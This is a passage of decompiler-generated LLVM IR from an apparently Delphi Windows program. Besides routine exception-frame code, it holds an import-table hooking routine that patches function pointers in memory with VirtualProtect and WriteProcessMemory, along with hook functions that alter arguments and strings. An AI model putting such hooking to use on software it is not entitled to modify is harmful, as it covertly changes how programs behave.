  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !1972
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1973
  %2 = load i32, i32* @global_var_4096e4, align 4, !insn.addr !1974
  %3 = add i32 %2, 1, !insn.addr !1974
  store i32 %3, i32* @global_var_4096e4, align 4, !insn.addr !1974
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !1975
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !1976
  ret i32 0, !insn.addr !1977
}

define i32 @function_4075b5() local_unnamed_addr {
dec_label_pc_4075b5:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1978
  ret i32 %0, !insn.addr !1978
}

define i32 @function_4075ba() local_unnamed_addr {
dec_label_pc_4075ba:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1979
}

define i32 @function_4075bc(i32 %arg1) local_unnamed_addr {
dec_label_pc_4075bc:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1980
}

define i32 @function_4075c0() local_unnamed_addr {
dec_label_pc_4075c0:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_4096e4, align 4, !insn.addr !1981
  %2 = add i32 %1, -1, !insn.addr !1981
  store i32 %2, i32* @global_var_4096e4, align 4, !insn.addr !1981
  ret i32 %0, !insn.addr !1982
}

define i32* @function_4075c8(i32* %Base, i8 %MappedAsImage, i16 %DirectoryEntry, i32* %Size) local_unnamed_addr {
dec_label_pc_4075c8:
  %0 = call i32* @ImageDirectoryEntryToData(i32* %Base, i8 %MappedAsImage, i16 %DirectoryEntry, i32* %Size), !insn.addr !1983
  ret i32* %0, !insn.addr !1983
}

define i32 @function_4075d0() local_unnamed_addr {
dec_label_pc_4075d0:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1984
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !1984
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !1984
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1985
  %2 = load i32, i32* @global_var_4096ec, align 4, !insn.addr !1986
  %3 = add i32 %2, 1, !insn.addr !1986
  store i32 %3, i32* @global_var_4096ec, align 4, !insn.addr !1986
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !1987
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !1988
  ret i32 0, !insn.addr !1989
}

define i32 @function_4075f5() local_unnamed_addr {
dec_label_pc_4075f5:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1990
  ret i32 %0, !insn.addr !1990
}

define i32 @function_4075fa() local_unnamed_addr {
dec_label_pc_4075fa:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1991
}

define i32 @function_4075fc(i32 %arg1) local_unnamed_addr {
dec_label_pc_4075fc:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1992
}

define i32 @function_407600() local_unnamed_addr {
dec_label_pc_407600:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_4096ec, align 4, !insn.addr !1993
  %2 = add i32 %1, -1, !insn.addr !1993
  store i32 %2, i32* @global_var_4096ec, align 4, !insn.addr !1993
  ret i32 %0, !insn.addr !1994
}

define i32 @function_407660(i8* %arg1, i8* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_407660:
  %esp.1.reg2mem = alloca i32, !insn.addr !1995
  %esp.0.in.reg2mem = alloca i32*, !insn.addr !1995
  %eax.0.reg2mem = alloca i32, !insn.addr !1995
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = call i32 @__decompiler_undefined_function_0()
  %4 = call i32 @__decompiler_undefined_function_0()
  %5 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %6 = trunc i32 %4 to i8, !insn.addr !1996
  %7 = icmp eq i8 %6, 0, !insn.addr !1996
  store i32* %stack_var_-20, i32** %esp.0.in.reg2mem, !insn.addr !1997
  br i1 %7, label %dec_label_pc_407673, label %dec_label_pc_40766b, !insn.addr !1997

dec_label_pc_40766b:                              ; preds = %dec_label_pc_407660
  %8 = call i32 @"@ClassCreate"(i32 %2, i32 %5, i32 %3, i32 %1, i32 %0), !insn.addr !1998
  store i32 %8, i32* %eax.0.reg2mem, !insn.addr !1998
  store i32* %stack_var_-36, i32** %esp.0.in.reg2mem, !insn.addr !1998
  br label %dec_label_pc_407673, !insn.addr !1998

dec_label_pc_407673:                              ; preds = %dec_label_pc_40766b, %dec_label_pc_407660
  %esp.0.in.reload = load i32*, i32** %esp.0.in.reg2mem
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  %esp.0 = ptrtoint i32* %esp.0.in.reload to i32
  %9 = add i32 %esp.0, -4, !insn.addr !1999
  %10 = and i32 %4, 255
  %11 = inttoptr i32 %10 to i8*, !insn.addr !2000
  %12 = call i32* @GetModuleHandleA(i8* %11), !insn.addr !2000
  %13 = ptrtoint i32* %12 to i32, !insn.addr !2000
  %14 = add i32 %eax.0.reload, 8, !insn.addr !2001
  %15 = inttoptr i32 %14 to i32*, !insn.addr !2001
  store i32 %13, i32* %15, align 4, !insn.addr !2001
  %16 = icmp eq i32* %12, null, !insn.addr !2002
  store i32 %9, i32* %esp.1.reg2mem, !insn.addr !2003
  br i1 %16, label %dec_label_pc_4076cb, label %dec_label_pc_40768f, !insn.addr !2003

dec_label_pc_40768f:                              ; preds = %dec_label_pc_407673
  %17 = ptrtoint i8* %arg1 to i32, !insn.addr !2004
  %18 = add i32 %eax.0.reload, 12, !insn.addr !2005
  %19 = inttoptr i32 %18 to i32*, !insn.addr !2005
  store i32 %17, i32* %19, align 4, !insn.addr !2005
  %20 = ptrtoint i8* %arg2 to i32, !insn.addr !2006
  %21 = add i32 %eax.0.reload, 16, !insn.addr !2007
  %22 = inttoptr i32 %21 to i32*, !insn.addr !2007
  store i32 %20, i32* %22, align 4, !insn.addr !2007
  %23 = add i32 %eax.0.reload, 20, !insn.addr !2008
  %24 = inttoptr i32 %23 to i32*, !insn.addr !2008
  store i32 %arg3, i32* %24, align 4, !insn.addr !2008
  %25 = load i32, i32* %22, align 4, !insn.addr !2009
  %26 = add i32 %esp.0, -8, !insn.addr !2010
  %27 = inttoptr i32 %26 to i32*, !insn.addr !2010
  store i32 %25, i32* %27, align 4, !insn.addr !2010
  %28 = add i32 %esp.0, -12, !insn.addr !2011
  %29 = inttoptr i32 %28 to i32*, !insn.addr !2011
  store i32 %17, i32* %29, align 4, !insn.addr !2011
  %30 = call i32* @GetModuleHandleA(i8* bitcast (i32* @0 to i8*)), !insn.addr !2012
  %31 = ptrtoint i32* %30 to i32, !insn.addr !2012
  %32 = add i32 %esp.0, -16, !insn.addr !2013
  %33 = inttoptr i32 %32 to i32*, !insn.addr !2013
  store i32 %31, i32* %33, align 4, !insn.addr !2013
  %34 = call i32 ()* @GetProcAddress(i32* nonnull @0, i8* bitcast (i32* @0 to i8*)), !insn.addr !2014
  %35 = ptrtoint i32 ()* %34 to i32, !insn.addr !2014
  %36 = add i32 %eax.0.reload, 24, !insn.addr !2015
  %37 = inttoptr i32 %36 to i32*, !insn.addr !2015
  store i32 %35, i32* %37, align 4, !insn.addr !2015
  %38 = icmp eq i32 ()* %34, null, !insn.addr !2016
  store i32 %32, i32* %esp.1.reg2mem, !insn.addr !2017
  br i1 %38, label %dec_label_pc_4076cb, label %dec_label_pc_4076b7, !insn.addr !2017

dec_label_pc_4076b7:                              ; preds = %dec_label_pc_40768f
  %39 = load i32, i32* %24, align 4, !insn.addr !2018
  %40 = add i32 %esp.0, -20, !insn.addr !2019
  %41 = inttoptr i32 %40 to i32*, !insn.addr !2019
  store i32 %39, i32* %41, align 4, !insn.addr !2019
  %42 = load i32, i32* %15, align 4, !insn.addr !2020
  %43 = add i32 %esp.0, -24, !insn.addr !2021
  %44 = inttoptr i32 %43 to i32*, !insn.addr !2021
  store i32 %42, i32* %44, align 4, !insn.addr !2021
  %45 = call i32 @function_407734(i32 ptrtoint (i32* @0 to i32)), !insn.addr !2022
  store i32 %43, i32* %esp.1.reg2mem, !insn.addr !2022
  br label %dec_label_pc_4076cb, !insn.addr !2022

dec_label_pc_4076cb:                              ; preds = %dec_label_pc_4076b7, %dec_label_pc_40768f, %dec_label_pc_407673
  br i1 %7, label %dec_label_pc_4076e2, label %dec_label_pc_4076d3, !insn.addr !2023

dec_label_pc_4076d3:                              ; preds = %dec_label_pc_4076cb
  %esp.1.reload = load i32, i32* %esp.1.reg2mem
  %46 = call i32 @function_402b48(), !insn.addr !2024
  %47 = inttoptr i32 %esp.1.reload to i32*, !insn.addr !2025
  %48 = load i32, i32* %47, align 4, !insn.addr !2025
  call void @__writefsdword(i32 0, i32 %48), !insn.addr !2025
  br label %dec_label_pc_4076e2, !insn.addr !2026

dec_label_pc_4076e2:                              ; preds = %dec_label_pc_4076d3, %dec_label_pc_4076cb
  %49 = add i32 %eax.0.reload, 4, !insn.addr !2027
  %50 = inttoptr i32 %49 to i32*, !insn.addr !2027
  %51 = inttoptr i32 %9 to i32*, !insn.addr !1999
  ret i32 %eax.0.reload, !insn.addr !2028
}

define i32 @function_4076ec() local_unnamed_addr {
dec_label_pc_4076ec:
  %eax.1.reg2mem = alloca i32, !insn.addr !2029
  %eax.0.reg2mem = alloca i32, !insn.addr !2029
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = call i32 @"@BeforeDestruction"(i32 %1, i32 %0), !insn.addr !2030
  %4 = add i32 %3, 8, !insn.addr !2031
  %5 = inttoptr i32 %4 to i32*, !insn.addr !2031
  %6 = load i32, i32* %5, align 4, !insn.addr !2031
  %7 = icmp eq i32 %6, 0, !insn.addr !2031
  store i32 %3, i32* %eax.0.reg2mem, !insn.addr !2032
  br i1 %7, label %dec_label_pc_407726, label %dec_label_pc_4076fd, !insn.addr !2032

dec_label_pc_4076fd:                              ; preds = %dec_label_pc_4076ec
  %8 = add i32 %3, 24, !insn.addr !2033
  %9 = inttoptr i32 %8 to i32*, !insn.addr !2033
  %10 = load i32, i32* %9, align 4, !insn.addr !2033
  %11 = icmp eq i32 %10, 0, !insn.addr !2033
  store i32 %3, i32* %eax.0.reg2mem, !insn.addr !2034
  br i1 %11, label %dec_label_pc_407726, label %dec_label_pc_407703, !insn.addr !2034

dec_label_pc_407703:                              ; preds = %dec_label_pc_4076fd
  %12 = add i32 %3, 4, !insn.addr !2035
  %13 = inttoptr i32 %12 to i32*, !insn.addr !2035
  %14 = load i32, i32* %13, align 4, !insn.addr !2035
  %15 = inttoptr i32 %14 to i8*, !insn.addr !2036
  %16 = call i32* @GetModuleHandleA(i8* %15), !insn.addr !2037
  %17 = ptrtoint i32* %16 to i32, !insn.addr !2037
  %18 = load i32, i32* %5, align 4, !insn.addr !2038
  %19 = icmp eq i32 %18, %17, !insn.addr !2038
  %20 = icmp eq i1 %19, false, !insn.addr !2039
  store i32 %17, i32* %eax.0.reg2mem, !insn.addr !2039
  br i1 %20, label %dec_label_pc_407726, label %dec_label_pc_407711, !insn.addr !2039

dec_label_pc_407711:                              ; preds = %dec_label_pc_407703
  %21 = load i32, i32* %9, align 4, !insn.addr !2040
  %22 = call i32 @function_407734(i32 %21), !insn.addr !2041
  store i32 %22, i32* %eax.0.reg2mem, !insn.addr !2041
  br label %dec_label_pc_407726, !insn.addr !2041

dec_label_pc_407726:                              ; preds = %dec_label_pc_407711, %dec_label_pc_407703, %dec_label_pc_4076fd, %dec_label_pc_4076ec
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  %23 = trunc i32 %2 to i8, !insn.addr !2042
  %24 = icmp slt i8 %23, 1
  store i32 %eax.0.reload, i32* %eax.1.reg2mem, !insn.addr !2043
  br i1 %24, label %dec_label_pc_407731, label %dec_label_pc_40772a, !insn.addr !2043

dec_label_pc_40772a:                              ; preds = %dec_label_pc_407726
  %25 = call i32 @"@ClassDestroy"(), !insn.addr !2044
  store i32 %25, i32* %eax.1.reg2mem, !insn.addr !2044
  br label %dec_label_pc_407731, !insn.addr !2044

dec_label_pc_407731:                              ; preds = %dec_label_pc_40772a, %dec_label_pc_407726
  %eax.1.reload = load i32, i32* %eax.1.reg2mem
  ret i32 %eax.1.reload, !insn.addr !2045
}

define i32 @function_407734(i32 %arg1) local_unnamed_addr {
dec_label_pc_407734:
  %eax.0.reg2mem = alloca i32, !insn.addr !2046
  %esp.0.reg2mem = alloca i32, !insn.addr !2046
  %storemerge6.reg2mem = alloca i32, !insn.addr !2046
  %.reg2mem14 = alloca i32, !insn.addr !2046
  %esp.17.reg2mem = alloca i32, !insn.addr !2046
  %esi.08.reg2mem = alloca i32, !insn.addr !2046
  %.reg2mem = alloca i32, !insn.addr !2046
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %stack_var_8 = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %3 = icmp sgt i32 %arg1, -1, !insn.addr !2047
  %4 = icmp eq i1 %3, false, !insn.addr !2048
  %5 = icmp eq i32 %arg1, 0, !insn.addr !2049
  %or.cond = or i1 %5, %4
  br i1 %or.cond, label %dec_label_pc_4077e1, label %dec_label_pc_40775a, !insn.addr !2048

dec_label_pc_40775a:                              ; preds = %dec_label_pc_407734
  %6 = trunc i32 %2 to i16, !insn.addr !2050
  %7 = trunc i32 %1 to i8, !insn.addr !2051
  store i32 %arg1, i32* %stack_var_-52, align 4, !insn.addr !2052
  %8 = inttoptr i32 %0 to i32*, !insn.addr !2053
  %9 = call i32* @ImageDirectoryEntryToData(i32* %8, i8 %7, i16 %6, i32* nonnull @0), !insn.addr !2053
  %10 = ptrtoint i32* %9 to i32, !insn.addr !2053
  %11 = icmp eq i32* %9, null, !insn.addr !2054
  store i32 %10, i32* %eax.0.reg2mem, !insn.addr !2055
  br i1 %11, label %dec_label_pc_4077e1, label %dec_label_pc_4077da.preheader, !insn.addr !2055

dec_label_pc_4077da.preheader:                    ; preds = %dec_label_pc_40775a
  %12 = add i32 %10, 12, !insn.addr !2056
  %13 = inttoptr i32 %12 to i32*, !insn.addr !2056
  %14 = load i32, i32* %13, align 4, !insn.addr !2056
  %15 = icmp eq i32 %14, 0, !insn.addr !2057
  %16 = icmp eq i1 %15, false, !insn.addr !2058
  store i32 %14, i32* %eax.0.reg2mem, !insn.addr !2058
  br i1 %16, label %dec_label_pc_407773.lr.ph, label %dec_label_pc_4077e1, !insn.addr !2058

dec_label_pc_407773.lr.ph:                        ; preds = %dec_label_pc_4077da.preheader
  %17 = ptrtoint i32* %stack_var_-52 to i32, !insn.addr !2052
  %sext = mul i32 %1, 16777216
  %18 = sdiv i32 %sext, 16777216, !insn.addr !2059
  %sext4 = mul i32 %2, 65536
  %19 = sdiv i32 %sext4, 65536
  %20 = ptrtoint i32* %stack_var_-20 to i32
  %21 = ptrtoint i32* %stack_var_-24 to i32
  %22 = ptrtoint i32* %stack_var_8 to i32
  store i32 %14, i32* %.reg2mem
  store i32 %10, i32* %esi.08.reg2mem
  store i32 %17, i32* %esp.17.reg2mem
  br label %dec_label_pc_407773

dec_label_pc_407773:                              ; preds = %dec_label_pc_407773.lr.ph, %dec_label_pc_4077d7
  %esp.17.reload = load i32, i32* %esp.17.reg2mem
  %esi.08.reload = load i32, i32* %esi.08.reg2mem
  %.reload = load i32, i32* %.reg2mem
  %23 = add i32 %.reload, %arg1, !insn.addr !2060
  %24 = add i32 %esp.17.reload, -4, !insn.addr !2061
  %25 = inttoptr i32 %24 to i32*, !insn.addr !2061
  store i32 %18, i32* %25, align 4, !insn.addr !2061
  %26 = add i32 %esp.17.reload, -8, !insn.addr !2062
  %27 = inttoptr i32 %26 to i32*, !insn.addr !2062
  store i32 %23, i32* %27, align 4, !insn.addr !2062
  %28 = call i32 @lstrcmpiA(i8* bitcast (i32* @0 to i8*), i8* bitcast (i32* @0 to i8*)), !insn.addr !2063
  %29 = icmp eq i32 %28, 0, !insn.addr !2064
  %30 = icmp eq i1 %29, false, !insn.addr !2065
  store i32 %26, i32* %esp.0.reg2mem, !insn.addr !2065
  br i1 %30, label %dec_label_pc_4077d7, label %dec_label_pc_407786, !insn.addr !2065

dec_label_pc_407786:                              ; preds = %dec_label_pc_407773
  %31 = add i32 %esi.08.reload, 16, !insn.addr !2066
  %32 = inttoptr i32 %31 to i32*, !insn.addr !2066
  %33 = load i32, i32* %32, align 4, !insn.addr !2066
  %34 = add i32 %33, %arg1, !insn.addr !2067
  %35 = inttoptr i32 %34 to i32*, !insn.addr !2068
  %36 = load i32, i32* %35, align 4, !insn.addr !2068
  %37 = icmp eq i32 %36, 0, !insn.addr !2069
  %38 = icmp eq i1 %37, false, !insn.addr !2070
  store i32 %36, i32* %.reg2mem14, !insn.addr !2070
  store i32 %34, i32* %storemerge6.reg2mem, !insn.addr !2070
  store i32 %26, i32* %esp.0.reg2mem, !insn.addr !2070
  br i1 %38, label %dec_label_pc_40778e, label %dec_label_pc_4077d7, !insn.addr !2070

dec_label_pc_40778e:                              ; preds = %dec_label_pc_407786, %dec_label_pc_4077ce
  %storemerge6.reload = load i32, i32* %storemerge6.reg2mem
  %.reload15 = load i32, i32* %.reg2mem14
  %39 = icmp eq i32 %.reload15, %19, !insn.addr !2071
  %40 = icmp eq i1 %39, false, !insn.addr !2072
  br i1 %40, label %dec_label_pc_4077ce, label %dec_label_pc_407793, !insn.addr !2072

dec_label_pc_407793:                              ; preds = %dec_label_pc_40778e
  %41 = add i32 %esp.17.reload, -12, !insn.addr !2073
  %42 = inttoptr i32 %41 to i32*, !insn.addr !2073
  store i32 %20, i32* %42, align 4, !insn.addr !2073
  %43 = add i32 %esp.17.reload, -16, !insn.addr !2074
  %44 = inttoptr i32 %43 to i32*, !insn.addr !2074
  store i32 128, i32* %44, align 4, !insn.addr !2074
  %45 = add i32 %esp.17.reload, -20, !insn.addr !2075
  %46 = inttoptr i32 %45 to i32*, !insn.addr !2075
  store i32 4, i32* %46, align 4, !insn.addr !2075
  %47 = add i32 %esp.17.reload, -24, !insn.addr !2076
  %48 = inttoptr i32 %47 to i32*, !insn.addr !2076
  store i32 %storemerge6.reload, i32* %48, align 4, !insn.addr !2076
  %49 = call i1 @VirtualProtect(i32* nonnull @0, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32* nonnull @0), !insn.addr !2077
  %50 = add i32 %esp.17.reload, -28, !insn.addr !2078
  %51 = inttoptr i32 %50 to i32*, !insn.addr !2078
  store i32 %21, i32* %51, align 4, !insn.addr !2078
  %52 = add i32 %esp.17.reload, -32, !insn.addr !2079
  %53 = inttoptr i32 %52 to i32*, !insn.addr !2079
  store i32 4, i32* %53, align 4, !insn.addr !2079
  %54 = add i32 %esp.17.reload, -36, !insn.addr !2080
  %55 = inttoptr i32 %54 to i32*, !insn.addr !2080
  store i32 %22, i32* %55, align 4, !insn.addr !2080
  %56 = add i32 %esp.17.reload, -40, !insn.addr !2081
  %57 = inttoptr i32 %56 to i32*, !insn.addr !2081
  store i32 %storemerge6.reload, i32* %57, align 4, !insn.addr !2081
  %58 = call i32* @GetCurrentProcess(), !insn.addr !2082
  %59 = ptrtoint i32* %58 to i32, !insn.addr !2082
  %60 = add i32 %esp.17.reload, -44, !insn.addr !2083
  %61 = inttoptr i32 %60 to i32*, !insn.addr !2083
  store i32 %59, i32* %61, align 4, !insn.addr !2083
  %62 = call i1 @WriteProcessMemory(i32* nonnull @0, i32* nonnull @0, i32* nonnull @0, i32 ptrtoint (i32* @0 to i32), i32* nonnull @0), !insn.addr !2084
  %63 = add i32 %esp.17.reload, -48, !insn.addr !2085
  %64 = inttoptr i32 %63 to i32*, !insn.addr !2085
  store i32 %21, i32* %64, align 4, !insn.addr !2085
  %65 = load i32, i32* %stack_var_-20, align 4, !insn.addr !2086
  %66 = add i32 %esp.17.reload, -52, !insn.addr !2087
  %67 = inttoptr i32 %66 to i32*, !insn.addr !2087
  store i32 %65, i32* %67, align 4, !insn.addr !2087
  %68 = add i32 %esp.17.reload, -56, !insn.addr !2088
  %69 = inttoptr i32 %68 to i32*, !insn.addr !2088
  store i32 4, i32* %69, align 4, !insn.addr !2088
  %70 = add i32 %esp.17.reload, -60, !insn.addr !2089
  %71 = inttoptr i32 %70 to i32*, !insn.addr !2089
  store i32 %storemerge6.reload, i32* %71, align 4, !insn.addr !2089
  %72 = call i1 @VirtualProtect(i32* nonnull @0, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32* nonnull @0), !insn.addr !2090
  store i32 %70, i32* %esp.0.reg2mem, !insn.addr !2091
  br label %dec_label_pc_4077d7, !insn.addr !2091

dec_label_pc_4077ce:                              ; preds = %dec_label_pc_40778e
  %73 = add i32 %storemerge6.reload, 4, !insn.addr !2092
  %74 = inttoptr i32 %73 to i32*, !insn.addr !2068
  %75 = load i32, i32* %74, align 4, !insn.addr !2068
  %76 = icmp eq i32 %75, 0, !insn.addr !2069
  %77 = icmp eq i1 %76, false, !insn.addr !2070
  store i32 %75, i32* %.reg2mem14, !insn.addr !2070
  store i32 %73, i32* %storemerge6.reg2mem, !insn.addr !2070
  store i32 %26, i32* %esp.0.reg2mem, !insn.addr !2070
  br i1 %77, label %dec_label_pc_40778e, label %dec_label_pc_4077d7, !insn.addr !2070

dec_label_pc_4077d7:                              ; preds = %dec_label_pc_4077ce, %dec_label_pc_407786, %dec_label_pc_407793, %dec_label_pc_407773
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %78 = add i32 %esi.08.reload, 20, !insn.addr !2093
  %79 = add i32 %esi.08.reload, 32, !insn.addr !2056
  %80 = inttoptr i32 %79 to i32*, !insn.addr !2056
  %81 = load i32, i32* %80, align 4, !insn.addr !2056
  %82 = icmp eq i32 %81, 0, !insn.addr !2057
  %83 = icmp eq i1 %82, false, !insn.addr !2058
  store i32 %81, i32* %.reg2mem, !insn.addr !2058
  store i32 %78, i32* %esi.08.reg2mem, !insn.addr !2058
  store i32 %esp.0.reload, i32* %esp.17.reg2mem, !insn.addr !2058
  store i32 %81, i32* %eax.0.reg2mem, !insn.addr !2058
  br i1 %83, label %dec_label_pc_407773, label %dec_label_pc_4077e1, !insn.addr !2058

dec_label_pc_4077e1:                              ; preds = %dec_label_pc_4077d7, %dec_label_pc_4077da.preheader, %dec_label_pc_40775a, %dec_label_pc_407734
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  ret i32 %eax.0.reload, !insn.addr !2094
}

define i32 @function_4077ec(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_4077ec:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = add i32 %0, 24, !insn.addr !2095
  %2 = inttoptr i32 %1 to i32*, !insn.addr !2095
  %3 = load i32, i32* %2, align 4, !insn.addr !2095
  ret i32 %3, !insn.addr !2096
}

define i32 @function_4077f0() local_unnamed_addr {
dec_label_pc_4077f0:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !2097
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !2097
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !2097
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !2098
  %2 = load i32, i32* @global_var_4096f0, align 4, !insn.addr !2099
  %3 = add i32 %2, 1, !insn.addr !2099
  store i32 %3, i32* @global_var_4096f0, align 4, !insn.addr !2099
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !2100
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !2101
  ret i32 0, !insn.addr !2102
}

define i32 @function_407815() local_unnamed_addr {
dec_label_pc_407815:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !2103
  ret i32 %0, !insn.addr !2103
}

define i32 @function_40781a() local_unnamed_addr {
dec_label_pc_40781a:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !2104
}

define i32 @function_40781c(i32 %arg1) local_unnamed_addr {
dec_label_pc_40781c:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !2105
}

define i32 @function_407820() local_unnamed_addr {
dec_label_pc_407820:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_4096f0, align 4, !insn.addr !2106
  %2 = add i32 %1, -1, !insn.addr !2106
  store i32 %2, i32* @global_var_4096f0, align 4, !insn.addr !2106
  ret i32 %0, !insn.addr !2107
}

define i32 @function_407828(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_407828:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = call i32 @function_4077ec(i32 %1, i32 %2, i32 %0, i32 %arg1, i32 %arg2), !insn.addr !2108
  ret i32 %3, !insn.addr !2109
}

define i32 @function_407874(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_407874:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = icmp eq i32 %arg3, 2975, !insn.addr !2110
  %2 = icmp eq i1 %1, false, !insn.addr !2111
  %spec.select = select i1 %2, i32 %arg3, i32 2974
  %3 = call i32 @function_4077ec(i32 %0, i32 %arg1, i32 %arg2, i32 %spec.select, i32 %arg4), !insn.addr !2112
  ret i32 %3, !insn.addr !2113
}

define i32 @function_4078a4(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_4078a4:
  %stack_var_-32 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !2114
  store i32 %0, i32* %stack_var_-32, align 4, !insn.addr !2114
  %1 = ptrtoint i32* %stack_var_-32 to i32, !insn.addr !2114
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !2115
  %2 = call i32 @"@LStrFromPChar"(), !insn.addr !2116
  %3 = call i32 @"@LStrPos"(), !insn.addr !2117
  %4 = icmp slt i32 %3, 1
  %spec.select = select i1 %4, i32 %arg4, i32 ptrtoint ([33 x i8]* @global_var_40797c to i32)
  %5 = call i32 @"@LStrFromPChar"(), !insn.addr !2118
  %6 = call i32 @"@LStrPos"(), !insn.addr !2119
  %7 = icmp slt i32 %6, 1
  %esi.0 = select i1 %7, i32 %arg3, i32 ptrtoint ([33 x i8]* @global_var_40797c to i32)
  %8 = call i32 @function_4077ec(i32 %arg1, i32 %arg2, i32 %esi.0, i32 %spec.select, i32 %arg5), !insn.addr !2120
  call void @__writefsdword(i32 0, i32 %arg6), !insn.addr !2121
  %9 = call i32 @"@LStrArrayClr"(), !insn.addr !2122
  ret i32 %9, !insn.addr !2123
}

define i32 @function_40793c() local_unnamed_addr {
dec_label_pc_40793c:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !2124
  ret i32 %0, !insn.addr !2124
}

define i32 @function_407941() local_unnamed_addr {
dec_label_pc_407941:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !2125
}

define i32 @function_407943(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_407943:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !2126
}

define i32 @function_407953() local_unnamed_addr {
dec_label_pc_407953:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !2127
}

define i32 @function_4079a0() local_unnamed_addr {
dec_label_pc_4079a0:
  %0 = call i32 @function_407660(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_407a10, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_407a1c, i32 0, i32 0), i32 4225064), !insn.addr !2128
  store i32 %0, i32* @global_var_40810c, align 4, !insn.addr !2129
  %1 = call i32 @function_407660(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_407a10, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_407a38, i32 0, i32 0), i32 4225140), !insn.addr !2130
  store i32 %1, i32* @global_var_408110, align 4, !insn.addr !2131
  %2 = call i32 @function_407660(i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_407a50, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_407a5c, i32 0, i32 0), i32 4225188), !insn.addr !2132
  store i32 %2, i32* @global_var_408114, align 4, !insn.addr !2133
  ret i32 %2, !insn.addr !2134
}

define i32 @function_407a10(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8, i32 %arg9, i32 %arg10, i32 %arg11, i32 %arg12, i32 %arg13, i32 %arg14) local_unnamed_addr {
dec_label_pc_407a10:
  %merge.reg2mem = alloca i32, !insn.addr !2135
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = call i32 @__decompiler_undefined_function_0()
  %4 = call i32 @__decompiler_undefined_function_0()
  %5 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
